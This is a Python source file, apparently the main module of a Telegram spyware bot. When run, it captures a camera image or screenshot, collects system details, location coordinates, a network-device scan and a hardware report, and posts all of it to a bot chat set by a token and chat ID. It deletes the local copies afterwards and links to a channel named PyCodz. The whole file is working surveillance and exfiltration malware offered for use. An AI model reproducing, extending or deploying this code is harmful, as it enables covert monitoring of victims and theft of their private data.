import requests
import os
import json
from bot_config import BotConfig
from system_info import SystemInfo
from camera import CameraCapture
from network import NetworkAnalyzer


class MainBot:
    def __init__(self):
        self.config = BotConfig()
        self.sys_info = SystemInfo(self.config)
        self.camera = CameraCapture()
        self.network = NetworkAnalyzer()

    def create_location_keyboard(self):
        maps_url = f"https://www.google.com/maps?q={self.config.latitude},{self.config.longitude}"
        keyboard = {
            "inline_keyboard": [[
                {
                    "text": f"🗺️ {self.config.city} Location",
                    "url": maps_url,
                    "style":"danger"
                }
            ]]
        }
        return json.dumps(keyboard)

    def send_report(self):
        screenshot_ok, screenshot_file = self.camera.capture()
        caption = self.sys_info.get_summary()
        keyboard = self.create_location_keyboard()

        data = {
            "chat_id": self.config.CHAT_ID,
            "caption": caption,
            "parse_mode": "HTML",
            "reply_markup": keyboard
        }

        if screenshot_ok:
            with open(screenshot_file, 'rb') as photo:
                files = {'photo': photo}
                requests.post(self.config.SEND_PHOTO_URL, files=files, data=data)
            os.remove(screenshot_file)
        else:
            data['text'] = caption
            requests.post(f"https://api.telegram.org/bot{self.config.BOT_TOKEN}/sendMessage", data=data)

        self._send_detailed_reports()

    def _send_detailed_reports(self):
        net_file = self.network.save_to_file()
        hw_file = "hardware_report.txt"
        with open(hw_file, 'w', encoding='utf-8') as f:
            f.write(self.sys_info.get_full_report())


        media = json.dumps([
            {
                "type": "document",
                "media": "attach://net_file",
                "caption": "🕵️ NETWORK DEVICES & INTELLIGENCE"
            },
            {
                "type": "document",
                "media": "attach://hw_file",
                "caption": "⚙️ DETAILED HARDWARE SPECS"
            }
        ])

        with open(net_file, 'rb') as nf, open(hw_file, 'rb') as hf:
            files = {
                "net_file": nf,
                "hw_file": hf
            }
            data = {
                "chat_id": self.config.CHAT_ID,
                "media": media
            }
            requests.post(
                f"https://api.telegram.org/bot{self.config.BOT_TOKEN}/sendMediaGroup",
                files=files,
                data=data
            )

        os.remove(net_file)
        os.remove(hw_file)

        keyboardd = {
            "inline_keyboard": [[
                {
                    "text": "‹ PyCodz ›",
                    "url": "https://t.me/PyCodz",
                    "style": "primary"
                }
            ]]
        }
        requests.post(
            f"https://api.telegram.org/bot{self.config.BOT_TOKEN}/sendMessage",
            data={
                "chat_id": self.config.CHAT_ID,
                "text": "📎 Reports sent successfully",
                "reply_markup": json.dumps(keyboardd)
            }
        )


if __name__ == "__main__":
    MainBot().send_report()
